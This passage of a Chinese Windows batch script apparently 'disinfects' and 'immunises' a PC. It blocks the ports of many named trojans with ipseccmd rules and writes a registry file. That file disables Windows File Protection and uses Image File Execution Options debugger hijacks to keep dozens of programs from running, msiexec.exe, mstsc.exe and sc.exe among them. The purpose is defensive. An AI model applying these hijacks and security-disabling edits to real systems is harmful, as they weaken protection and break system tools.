ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7301" -f *+0:7301:TCP -n BLOCK -x >nul
echo 关闭木马NetMonitor 1.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9872" -f *+0:9872:TCP -n BLOCK -x >nul
echo 关闭木马Portal Of Doom默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
echo 关闭木马NetMonitor 2.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/11223" -f *+0:11223:TCP -n BLOCK -x >nul
echo 关闭木马Progenic Trojan默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7307" -f *+0:7307:TCP -n BLOCK -x >nul
echo 关闭木马NetMonitor 3.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1999" -f *+0:1999:TCP -n BLOCK -x >nul
echo 关闭木马BackDoor默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5800" -f *+0:5800:TCP -n BLOCK -x >nul
echo 关闭远程控制软件VNC默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5900" -f *+0:5900:TCP -n BLOCK -x >nul
echo 关闭远程控制软件VNC默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/22222" -f *+0:22222:TCP -n BLOCK -x >nul
echo 关闭木马Prosiak 0.47默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7626" -f *+0:7626:TCP -n BLOCK -x >nul
echo 关闭木马冰河默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4444" -f *+0:4444:TCP -n BLOCK -x >nul
echo 关闭木马msblast默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7308" -f *+0:7308:TCP -n BLOCK -x >nul
echo 关闭木马NetMonitor 4.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6129" -f *+0:6129:TCP -n BLOCK -x >nul
echo 关闭远程控制软件（dameware nt utilities)默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
echo 关闭木马Ripper默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1245" -f *+0:1245:TCP -n BLOCK -x >nul
echo 关闭木马VooDoo Doll默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/121" -f *+0:121:TCP -n BLOCK -x >nul
echo 关闭木马BO jammerkillahV默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/456" -f *+0:456:TCP -n BLOCK -x >nul
echo 关闭木马Hackers Paradise默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/555" -f *+0:555:TCP -n BLOCK -x >nul
echo 关闭木马Stealth Spy默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/666" -f *+0:666:TCP -n BLOCK -x >nul
echo 关闭木马Satanz Backdoor默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
echo 关闭木马Silencer默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1033" -f *+0:1033:TCP -n BLOCK -x >nul
echo 关闭木马Netspy默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7000" -f *+0:7000:TCP -n BLOCK -x >nul
echo 关闭木马Remote Grab默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7300 " -f *+0:7300:TCP -n BLOCK -x >nul
echo 关闭木马NetMonitor默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23456 " -f *+0:23456:TCP -n BLOCK -x >nul
echo 关闭木马Ugly FTP默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23456 " -f *+0:23456:TCP -n BLOCK -x >nul
echo 关闭木马Ugly FTP默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30100 " -f *+0:30100:TCP -n BLOCK -x >nul
echo 关闭木马NetSphere默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9872" -f *+0:9872:TCP -n BLOCK -x >nul
echo 关闭木马Portal of Doom默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9899" -f *+0:9899:TCP -n BLOCK -x >nul
echo 关闭木马iNi-Killer默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50505" -f *+0:50505:TCP -n BLOCK -x >nul
echo 关闭木马Sockets de Troie默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6939" -f *+0:6939:TCP -n BLOCK -x >nul
echo 关闭木马Indoctrination默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/11000" -f *+0:11000:TCP -n BLOCK -x >nul
echo 关闭木马Senna Spy默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/12223" -f *+0:12223:TCP -n BLOCK -x >nul
echo 关闭木马Hack?99 KeyLogger默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/12362" -f *+0:12362:TCP -n BLOCK -x >nul
echo 关闭木马Whack-a-mole 1.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20000" -f *+0:20000:TCP -n BLOCK -x >nul
echo 关闭木马Millenium默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2583" -f *+0:2583:TCP -n BLOCK -x >nul
echo 关闭木马Wincrash v2默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/53001" -f *+0:53001:TCP -n BLOCK -x >nul
echo 关闭木马Remote Windows Shutdown默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7789" -f *+0:7789:TCP -n BLOCK -x >nul
echo 关闭木马ICKiller默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40426" -f *+0:40426:TCP -n BLOCK -x >nul
echo 关闭木马Masters Paradise 3.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5569" -f *+0:5569:TCP -n BLOCK -x >nul
echo 关闭木马RoboHack默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8000" -f *+0:8000:TCP -n BLOCK -x >nul
echo 关闭木马huigezi默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9872" -f *+0:9872:TCP -n BLOCK -x >nul
echo 关闭木马Portal of Doom默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2005" -f *+0:2005:TCP -n BLOCK -x >nul
echo 关闭木马黑洞2005默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2000" -f *+0:2000:TCP -n BLOCK -x >nul
echo 关闭彩虹桥1.2默认端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9999" -f *+0:9999:TCP -n BLOCK -x >nul
echo 关闭huigezi映射默认端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -x >nul
gpupdate >nul
:shadu000002
cls
echo 杀毒成功！开始进行免疫...
cls
echo [HKEY_CURRENT_USER\Control Panel\Desktop]>>Fix.reg
echo "AutoEndTasks"="1">>Fix.reg
echo "HungAppTimeout"="200">>Fix.reg
echo "WaitToKillAppTimeout"="200">>Fix.reg
echo "WaitTOKillService"="200">>Fix.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control]>>Fix.reg
echo "WaitToKillServiceTimeout"="200">>Fix.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters]>>Fix.reg
echo "EnablePrefetcher"=dword:00000001>>Fix.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]>>Fix.reg
echo "SFCDisable"=dword:00000001>>Fix.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AlwaysUnloadDLL]>>Fix.reg
echo @="0">>Fix.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters]>>Fix.reg
echo "AutoShareServer"=dword:00000000>>Fix.reg
echo "AutoSharewks"=dword:00000000>>Fix.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Windows]>>Fix.reg
echo "NoPopUpsOnBoot"=dword:00000001>>Fix.reg
echo [HKEY_CLASSES_ROOT\lnkfile]>>Fix.reg
echo @="快捷方式">>Fix.reg
echo "EditFlags"=dword:00000001>>Fix.reg
echo "NeverShowExt"="">>Fix.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RemoteComputer\NameSpace]>>Fix.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RemoteComputer\NameSpace\{2227A280-3AEA-1069-A2DE-08002B30309D}]>>Fix.reg
echo @="Printers">>Fix.reg
echo [HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer]>>Fix.reg
echo "Link"=hex:00,00,00,00>>Fix.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters]>>Fix.reg
echo "EnablePrefetcher"=dword:00000003>>Fix.reg
echo [HKEY_USERS\.DEFAULT\Control Panel\Desktop]>>Fix.reg
echo "FontSmoothing"="2">>Fix.reg
echo "FontSmoothingType"=dword:00000002>>Fix.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings]>>Fix.reg
echo "MaxConnectionsPer1_0Server"=dword:00000008>>Fix.reg
echo "MaxConnectionsPerServer"=dword:00000008>>Fix.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control]>>Fix.reg
echo "WaitToKillServiceTimeout"="1000">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Shareaza.exe]>>Fix.reg
echo "Debugger"="c:\\中国超级BT.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\4047.exe]>>Fix.reg
echo "Debugger"="c:\\中国超级BT捆绑的病毒.exe">>Fix.reg


echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\qqfo1.0_dl.exe]>>Fix.reg
echo "Debugger"="c:\\P2P类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SuperLANadmin.exe]>>Fix.reg
echo "Debugger"="c:\\破坏类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Robocop.exe]>>Fix.reg
echo "Debugger"="c:\\破坏类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\diaoxian.exe]>>Fix.reg
echo "Debugger"="c:\\破坏类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\network.exe]>>Fix.reg
echo "Debugger"="c:\\破坏类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\冰点还原终结者.exe]>>Fix.reg
echo "Debugger"="c:\\破坏类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\3389.exe]>>Fix.reg
echo "Debugger"="c:\\破坏类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\3389.rar]>>Fix.reg
echo "Debugger"="c:\\破坏类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sc.exe]>>Fix.reg
echo "Debugger"="c:\\破坏类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mstsc.exe]>>Fix.reg
echo "Debugger"="c:\\破坏类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\3389dl.exe]>>Fix.reg
echo "Debugger"="c:\\破坏类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\3389dl.rar]>>Fix.reg
echo "Debugger"="c:\\破坏类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\黑社会.exe]>>Fix.reg
echo "Debugger"="c:\\破坏类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\还原精灵密码察看器.exe]>>Fix.reg
echo "Debugger"="bcvb">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmcc.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\bczp.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\3721.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\PodcastBarMiniStarter.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cdnns.dll]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cdnns.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\setupcnnic.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ieup.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SurfingPlus.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ok.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\123.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ieup.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\IESearch.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WinSC32.dll]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ZComService.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\skin.dll]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msiexec.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DrvIst.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MSIF1.tmp]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\NetMon.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LanecatTrial.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LEC_Client.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BTBaby.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WebThunder1.0.4.28deluxbeta.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WebThunder.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Thunder5.1.6.198.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ThunderMini2.0.0.29.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\is-TEQG7.tmp]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TingTing1.1.0.8Beta.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\is-C6R99.tmp]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\is-00KC0.tmp]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BitComet_0.68_setup.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BitComet.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BitComet0.62.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\100baoSetup120.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\GLBD.tmp]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DDD4_DXT168.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ppstreamsetup.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\PPStream.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TV100.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\is-S5LOA.tmp]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\is-S5L0A.tmp]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\teng.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TENG.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\is-RP216.tmp]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rongtv.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\hjsetup.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HJSETUP.EXE]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msiexec.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rep.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dudupros.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DuDuAcc.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Dmad-install.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\D-mad.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\004-PPGou-Dmad.EXE]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\PPGou.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TDUpdate.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\PodcastBarMini.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MyShares.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\vfp02.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\is-5SKT1.tmp]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\bgoomain.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\setup_L0029.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ns40.tmp]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\1032.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\yAssistSe.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ddos.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BitTorrent.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\drwtsn32.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Win98局域网攻击工具.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\NetThief.exe]>>Fix.reg
echo "Debugger"="c:\\网络神偷.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RemoteComputer.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\QQTailer.exe]>>Fix.reg
echo "Debugger"="c:\\制造出来的QQ病毒.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\傀儡僵尸DDOS攻击集合.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Alchem.exe]>>Fix.reg
echo "Debugger"="c:\\以下是存在风险病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\actalert.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

